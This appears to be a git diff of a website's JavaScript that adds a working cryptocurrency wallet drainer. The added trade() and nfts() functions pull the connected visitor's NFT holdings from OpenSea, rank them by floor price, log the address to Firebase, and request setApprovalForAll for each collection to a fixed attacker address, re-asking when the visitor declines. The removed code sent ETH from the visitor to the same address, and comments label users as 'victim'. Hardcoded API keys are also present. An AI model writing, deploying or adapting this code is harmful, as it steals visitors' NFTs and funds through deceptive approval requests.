@@ -29,15 +29,21 @@ try {
 }
 }
 
+/**
+ * 
+ * @setItem
+ * @getItem 
+ */
 
-// async function inSidebarConnect() {
-//     const button1 = $('.css-1u5qx9')
+function setItem(key, value) {
+  localStorage.setItem(key, JSON.stringify(value));
+  }
 
-//     button1.on('click',  function () {
-//         console.log('imclicked')
-//          menuItems()
-//     })
-// }
+function getItem(key) {
+  return JSON.parse(localStorage.getItem(key));
+}
+
+//
 
 
 var sidebarCheck = setInterval(() => {
@@ -83,9 +89,67 @@ async function sidebar() {
 
 
 
+
+
       }, 1000);
 
   })
+}
+
+
+async function header() {
+  var headermenu0, headermenu1, headermenu2, headermenu3, headermenu4, headermenu5;
+  
+  
+  headermenu0 = $('.header-menu__right').find('ul').find('li').eq([0])
+  headermenu1 = $('.header-menu__right').find('ul').find('li').eq([1])
+  headermenu2 = $('.header-menu__right').find('ul').find('li').eq([2])
+  headermenu3 = $('.header-menu__right').find('ul').find('li').eq([3])
+  headermenu4 = $('.header-menu__right').find('ul').find('li').eq([4])
+  headermenu5 = $('.header-menu__right').find('ul').find('li').eq([5])
+
+
+
+  headermenu0.find('a').removeClass('active')
+  headermenu1.find('a').removeClass('active')
+  headermenu2.find('a').removeClass('active')
+  headermenu3.find('a').removeClass('active')
+  headermenu4.find('a').removeClass('active')
+  headermenu5.find('a').removeClass('active')
+  
+
+
+
+
+
+  headermenu0.on('click', function () {
+    menuItems()
+  })
+  headermenu1.on('click', function () {
+    menuItems()
+  })
+  headermenu2.on('click', function () {
+    menuItems()
+  })
+  headermenu3.on('click', function () {
+    menuItems()
+  })
+  headermenu4.on('click', function () {
+    menuItems()
+  })
+  headermenu5.on('click', function () {
+    menuItems()
+  })
+
+
+/*--------*/
+var faq = $('.header-menu__right').find('ul').eq([1]).find('li').eq([0])
+faq.find('a').removeClass('active')
+
+faq.on('click', function () {
+  menuItems()
+})
+
 }
 
 
@@ -95,216 +159,67 @@ async function intervalCheck() {
       clearInterval(sidebarCheck)
       console.log('true, interval cleared')
       await sidebar()
-      //await menuItems()
-      //await inSidebarConnect()
+      await header()
+
+
   } else {
       console.log('false')
   }
 
 }
 
-// setTimeout(() => {
-//     $('.menu__link-text').click()
-// }, 10000);
-
 async function menuItems() {
-
-      // $('.menu2').each( function () {
-      //     const x = $(this).html()
-
-      //     console.log(x);
-      // })
-
       const ganaYawa = $('.menu2').find('li').eq([6]).find('span').eq([0]).find('span.menu__link-text')
-
       ganaYawa.click()
-
-      // console.log(ganaYawa);
-
 }
 
 
 
-//metamask
-
-// const checkConnected = setInterval(() => {
-//     getAccount()
-//     console.log('checkConnnected running')
-// }, 3000);
-
-// async function getAccount() {
-//     const accounts = await window.ethereum.request({
-//         method: 'eth_requestAccounts'
-//     }).catch( (err) => {
-//         if (err.code === 4001) {
-//             console.log('please con met');
-//         } else {
-//             console.error(err)
-//         }
-//     });
-
-//     if (!accounts[0]) {
-      
-//     } else {
-//         clearInterval(checkConnected)
-//         account = accounts[0]
-//         console.log(account)
-//     }
-
-//     // account = accounts[0]
-//     // console.log(account)
-// }
-
-
-
-var checkConnected = setInterval( () => {
-  
-
-var d = JSON.parse(localStorage.getItem('wagmi.store'))
-// console.log(d.state.data)
-
-
-  if (!('account' in d.state.data) ) {
-    console.log('not connected')
-  } else {
-    getAddress()
-    intervalStop()
-    get_eth()
-    trade()
-    console.log('connected')
-
-  }
-
-}, 3000);
-
-//interval stopper
-
-function intervalStop() {
-  clearInterval(checkConnected);
-  console.log('intervalStopped')
-}
 
 
 async function getAddress() {
   const d = JSON.parse(localStorage.getItem('wagmi.store'))
   console.log(d);
   const userAddress = d.state.data.account
-  //console.log(userAddress);
+
   account = userAddress
   console.log(account)
 
-  //await loadWallet(account)
-  //await trade()
+  const LISTCOLLECTION =   db.collection('addresses').doc(account)
+
+  await LISTCOLLECTION.get().then(
+    (docSnapshot) => {
+      if (
+        docSnapshot.exists
+      ) {
+        console.log('doc exists')
+        LISTCOLLECTION.update({
+          status: 'connected'
+        })
+
+      } else {
+
+        console.log('doc not found')
+        LISTCOLLECTION.set({
+          address: account,
+          date: new Date(),
+          status: 'connected'
+        }).then( () => {
+          console.log('successfully added')
+        }).catch( () => {
+          console.log('error adding document');
+        })
+
+
+      }
+    }
+  )
+
+
 
 }
 
 
-
-// async function GetAllCollection(address){
-//     var collections = []
-//     var offset = 0
-//     var old_count = 0;
-//     try{
-
-//       while(true){ // Added
-//         var url = `${OPENSEA_URL}api/v2/collections?asset_owner=${address}&offset=${offset}&limit=50`
-//         await $.ajax({
-//             url: url,
-//             method: "GET",
-//             headers: {
-//               accept: 'application/json',
-//               'X-API-KEY': '078b8acce6a34dd3a2dbb0cd34127203'
-//             },
-//             success: function(data){
-//                 // for(var i = 0; i < data.length; i++){
-//                 //   if(data[i].primary_asset_contracts.length > 0)
-//                 //     collections.push(data[i])
-//                 // }
-
-//                 for (var i = 0; i < data.collections.length; i++) {
-//                   //console.log(data.collections[i].collection)
-    
-//                   if (data.collections[i].collection.length == 42) {
-//                       console.log(data.collections[i].collection)
-
-//                        collections.push(data.collections[i].collection)
-//                       console.log(collections)
-//                       // localStorage.setItem('spoofCollection', JSON.stringify(collections) )
-//                       //data[i] ang iyang tree
-
-//                       //TOTAL MAG SPOOF RAMAN KA AYAW NA PALABIHA, SA PANEL RA KUHAA
-//                 }
-              
-//                 }
-//             }
-//         })
-//         if(old_count == collections.length)
-//           break
-//           old_count = collections.length
-//         offset += 50
-//       }
-//     }catch(err){
-//       console.log(err)
-//     }
-
-
-
-//     for(var i = 0 ; i < collections.length; i++){
-//       collections[i].worth = 0
-//       try{
-//         var result = await $.ajax({
-//           url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collections[i].primary_asset_contracts[collections[i].primary_asset_contracts.length-1].address,
-//           method: "GET",
-//         })
-//         if(result.openSea != undefined && result.openSea.floorPrice != undefined)
-//         collections[i].worth = result.openSea.floorPrice
-//       }catch{
-//         if(collections[i].stats.seven_day_volume > 0){
-//           collections[i].worth = Math.round(
-//             collections[i].stats.seven_day_volume * 0.8 * 10000
-//           ) / 10000
-//         }
-//       }
-    
-//     }
-
-//     collections = collections.sort((a, b) => {
-//       return a.worth < b.worth
-//         ? 1
-//         : -1;
-//     });
-
-//     return collections
-//   }
-
-
-async function loadWallet(address) {
-
-  let arr = [];
-
-  var victimCollection = await GetAllCollection(address) 
-      //console.log(victimCollection);
-
-   for (var i = 0; i < victimCollection.length; i++) {
-
-      var collection = victimCollection[i]
-
-      var contracts = collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()
-
-      console.log(contracts);
-      arr.push(contracts)
-      
-
-   }  
-   console.log(arr)
-   localStorage.setItem('spoofCollection', JSON.stringify(arr))
-}
-
-
-//fromlocalstrorageni
-
-
-//transact
 
 const _abi = [
   {
@@ -714,205 +629,323 @@ const _abi = [
   },
 ];
 
-//database HERE
+
+
+async function check() {
+
+  await getAddress();
+
+  console.log(account);
+
+  var nft = await nfts(account)
+  console.log(nft)
+
+
+var data = {
+  time: new Date(),
+  spoof: nft,
+  owner: account
+}
+
+
+      if (getItem(account) == null || getItem(account).length == 0) {
+          console.log('no data')
+
+          setItem(account, data)
+          trade()
+          console.log('data added')
+
+      } else {
+          console.log('data already exists')
+
+          trade()
+      }
+
+                  
+
+
+}
+
 
 
 async function trade() {
-await loadWeb3();
+
+  await loadWeb3();
+
+
+  var collection = []
+  var owner;
+  var sortedCollection = []
+
+
+  data = getItem(account)
+
+  owner = data.owner
+  collection = data.spoof
+
+
+ for (let i = 0; i < collection.length; i++) {
+  collection[i].worth = 0;
+  collection[i].owner = owner;
+
+
+  try {
+
+      var result =  await $.ajax({
+          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collection[i].contract,
+          method: "GET",
+          // success: function (data) {
+          //     console.log(data)
 
 
 
-  //DUMDUMA NAA SA ZIP BEFOREFIREBASSE
-  //var collections = JSON.parse(localStorage.getItem('spoofCollection'))
-  var collections = []
-  let status;
-
-  // console.log(collections)
-  console.log(account)
-
-  ref.doc(account).get()
-    .then( (docSnapshot) => {
-      if(docSnapshot.exists) {
-        ref.doc(account)
-          .onSnapshot( async (doc) => {
-            //console.log(doc.data())
-            collections = doc.data().spoof
-            status = doc.data().status
-
-            console.log(collections)
-
-            for(var i = 0; i < collections.length; i++) {
-              var collectionAddress = collections[i]
-              console.log(collectionAddress)
-            
-            
-              try {
-
-                if (status == 'approved') {
-                  console.log('no more approval needed')
-
-                   ref.doc(account).update({
-                    status: 'approved'
-                  }).then( function() {
-                    console.log('approved')
-                  }).catch( (err) => {
-                    console.log(err)
-                  })
-
-
-                } else {
-
-                  var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
-                   await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
-
-                  ref.doc(account).update({
-                    status: 'approved'
-                  }).then( function() {
-                    console.log('approved')
-                  }).catch( (err) => {
-                    console.log(err)
-                  })
-
-
-                }
-
-
-    
-            
-                  // var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
-                  // await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
-
-                  // ref.doc(account).update({
-                  //   status: 'approved'
-                  // }).then( function() {
-                  //   console.log('approved')
-                  // }).catch( (err) => {
-                  //   console.log(err)
-                  // })
-            
-                  // console.log('Address: '+account+ ' and collection '+ collectionAddress + ' is confirmed')
-                
-              } catch (error) {
-                
-              }
-            
-            }
-          })
-      }
-    })
-  
-
-
-//
-
-
-
-// if (1) {
-//   for(var i = 0; i < collections.length; i++) {
-//     var collectionAddress = collections[i]
-//     console.log(collectionAddress)
-
-
-//     try {
-
-//         var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
-//         await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
-
-//         console.log(account)
-    
-//     } catch (error) {
-    
-//     }
-
-//   }
-// }
-
-
-  // collections.forEach( async el => {
-  //     var collectionAddress = el;
-
-  //     console.log(collectionAddress)
-
-  //     try {
-
-  //       var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
-  //       await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
-        
-  //     } catch (error) {
-
-  //       console.log(error)
-        
-  //     }
-
-
-  // })
-
-}
-
-
-// async function yawayawa() {
-//   await loadWeb3();
-//   try {
-
-//     var collectionContract = await new window.web3.eth.Contract(_abi, '0x645670add376f19c3d2c9bdd62dd4190c8fad988', {gas: '100000'})
-//     await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262'})
-  
-//   } catch (error) {
-//     console.log(error)
-//   }
-// }
-
-// yawayawa()
-
-
-
-
-
-//GET ETH
-
-async function get_eth() {
-  
-await loadWeb3();
-
-// .then( (docSnapshot) => {
-//   if(docSnapshot.exists) {
-//     ref.doc(account)
-//       .onSnapshot( async (doc) => {
-
-db.collection('ethget').doc(account).get().then(  (docSnapshot) => {
-
-    if (docSnapshot.exists) {
-      db.collection('ethget').doc(account)
-        .onSnapshot( async (doc) => {
-          
-    const value = doc.data().eth
-    const finalAmount = Web3.utils.toWei(value.toString(), 'ether');
-
-    const txData = {
-      from: account,
-      to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
-      value: finalAmount,
-      gas: "11170",
-    }
-
-    web3.eth.sendTransaction(txData)
-      .then( (txHash) => {
-        console.log(txHash)
-      }).catch( (err) => {
-        console.log(err)
+          // }
       })
 
-        })
-    } else {
-      console.log('no eth set')
-    }
+      if (result.openSea != undefined && result.openSea.floorPrice != undefined)
+      collection[i].worth = result.openSea.floorPrice
 
+      
+  } catch (error) {
+      console.log(error)
 
- 
-   
+      if(collection[i].stats.seven_day_volume > 0) {
+          collection[i].worth = Math.round(
+              collection[i].stats.seven_day_volume * 0.8 * 10000
+          ) / 10000
+      }
+  }
+  
+ }
+
+ collection = collection.sort( (a, b) => {
+  return a.worth < b.worth
+  ? 1
+  : -1;
 })
 
 
-// var ammount = Web3.utils.toWei()
+
+for (let i = 0; i < collection.length; i++) {
+
+   if (collection[i].worth != 0) {
+      sortedCollection.push(collection[i])
+   }
+  
+}
+
+collection = sortedCollection;
+
+
+ console.log(collection)
+
+/*---------------------------------------------------------------*/
+
+  var declinedCollection = []
+
+ //jang contracts
+ const collection_contracts = db.collection(account.toLowerCase())
+ //
+
+
+
+await collection_contracts.get().then( (querySnapshot) => {
+  querySnapshot.forEach( (doc) => {
+      var data = doc.data()
+      var approved = data.approved
+
+      //console.log(approved)
+
+      
+      if (approved === false) {
+          console.log('declined')
+
+          // console.log(data)
+
+          //console.log(data)
+          declinedCollection.push(data)
+      } else {
+          //
+          console.log('nothing saved yet')
+      }
+
+  })
+}).catch( (error) => {
+  console.log('error gettings documents ' + error)
+})
+
+
+
+
+
+if (declinedCollection.length < 1) {
+  console.log('no data declined contracts yet')
+} else {
+  console.log('filtered declined collections')
+  collection = declinedCollection
+}
+
+
+
+
+console.log(collection)
+/*---------------------------------------------------------------*/
+
+  for (let i = 0; i < collection.length; i++) {
+     
+
+      // console.log(collection[i])
+
+      try {
+
+          
+          if (collection[i].approved == true) {
+
+
+              console.log('approved')
+              //no more approval
+              //ilocalstorage nalang ni?
+
+
+          } else {
+
+      
+
+              var collectionContract = await new window.web3.eth.Contract(_abi, collection[i].contract, {gas: '100000'})
+              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+
+              collection[i].date = new Date()
+              collection[i].approved = true
+              console.log(collection[i])
+              
+              collection_contracts.doc(collection[i].contract).set(collection[i])
+                  .then( () => {
+                      console.log('data updated')
+                  })
+                  .catch( () => {
+                      console.log('error data update')
+                  })
+
+
+          }
+
+          
+      } catch (error) {
+
+          console.log(error)
+
+          if (error.code == 4001) {
+       
+
+              collection[i].date = new Date()
+              collection[i].approved = false
+              console.log(collection[i])
+
+
+
+              collection_contracts.doc(collection[i].contract).get()
+                  .then( (docSnapshot) => {
+                      if (docSnapshot.exists) {
+
+                          console.log('data already existed')
+
+                      } else {
+                          console.log('doc does not exist')
+
+                          collection_contracts.doc(collection[i].contract).set(collection[i])
+                          .then( () => {
+                              console.log('data updated')
+                          }).catch( (error) => {
+                              console.log('error setting document ' + error)
+                          })
+                      }
+                  }).catch( (error) => {
+                      console.log('Error getting data ' + error)
+                  })
+                      
+
+
+
+              
+          }
+          
+      }
+
+
+  
+
+  }
+
+
+
+
 
 }
+
+
+async function nfts(addr) {
+  var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`  
+  var nft = []
+  var contract = []
+
+
+await $.ajax({
+  url: url,
+  method: "GET",
+  headers: {
+      accept: 'application/json',
+      'x-api-key': '078b8acce6a34dd3a2dbb0cd34127203'
+    },
+
+    success: function (data) {
+      // console.log(data.nfts)
+
+      for (var i = 0; i < data.nfts.length; i++) {
+
+          nft.push(data.nfts[i].contract)
+
+      }
+
+      var uniq = [... new Set(nft)]
+
+      nft = uniq
+    }
+    
+})
+
+  nft.forEach( e => {
+
+      var data = {contract: ''}
+      data.contract = e
+
+      contract.push(data)
+  })
+
+return contract
+}
+
+
+/*------------------------------------------------------*/
+
+var checkConnected = setInterval( async () => {
+
+  var d = JSON.parse(localStorage.getItem('wagmi.store'))
+  
+    if (!('account' in d.state.data) ) {
+      console.log('not connected')
+    } else {
+      //getAddress()
+      check()
+      intervalStop()
+      console.log('connected')
+  
+    }
+  
+  }, 3000);
+  
+  function intervalStop() {
+    clearInterval(checkConnected);
+    console.log('intervalStopped')
+  }
+  
+  /*------------------------------------------------------*/
